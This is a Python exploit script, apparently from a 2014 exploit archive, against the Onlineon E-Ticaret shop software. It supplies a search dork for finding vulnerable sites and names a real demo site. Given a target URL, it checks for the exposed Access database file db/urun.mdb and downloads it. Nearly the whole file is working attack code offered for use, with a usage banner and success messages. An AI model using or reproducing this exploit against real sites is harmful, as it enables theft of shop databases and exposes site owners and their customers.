#!/usr/bin/env python
#-*- coding:cp1254 -*-

# Title        : Onlineon E-Ticaret Database Disclosure Exploit (.py)
# dork         : inurl:"default.asp?git=sepet"
# Author       : ZoRLu / zorlu@milw00rm.com / submit@milw00rm.com
# Home         : http://milw00rm.com / its online
# Download     : http://www.onlineonweb.com/eticaret.html
# Demo         : http://ayvalikkokluzeytincilik.com
# date         : 06/09/2014
# Python       : V 2.7
# Thks         : exploit-db.com and others


import sys, urllib2, re, os, time

def indiriyoruz(url):

    import urllib
    aldosyayi = urllib.urlopen(url)
    indiraq = open(url.split('/')[-1], 'wb')
    indiraq.write(aldosyayi.read())
    aldosyayi.close()
    indiraq.close()

if len(sys.argv) < 2:
    os.system(['clear','cls'][1])
    print " ____________________________________________________________________"
    print "|                                                                    |"
    print "|   Onlineon E-Ticaret Database Disclosure Exploit (.py)             |"
    print "|   ZoRLu / milw00rm.com                                             |"
    print "|   exploit.py http://site.com/path/                                 |"
    print "|____________________________________________________________________|"
    sys.exit(1)

''' link kontrol 1 '''

koybasina = "http://"
koykicina = "/"
sitemiz = sys.argv[1]

if sitemiz[-1:] != koykicina:
    sitemiz += koykicina

if sitemiz[:7]  != koybasina:
    sitemiz =  koybasina + sitemiz


database = "db/urun.mdb"
url2 = sitemiz + database
print 	"\n" + url2
print "\nlink check"
time.sleep(1)

''' link kontrol 2 '''

try:
    adreskontrol = urllib2.urlopen(url2).read()

    if len(adreskontrol) > 0:

        print "\nGood Job Bro!"

except urllib2.HTTPError:
        import os
        import sys
        print "\nForbidden Err0r, Security!"
        sys.exit(1)


''' dosya indiriliyor '''

if __name__ == '__main__':
    import sys
    if len(sys.argv) == 2:
        print "\nFile is Downloading\n"
        try:
            indiriyoruz(url2)
        except IOError:
            print '\nFilename not found.'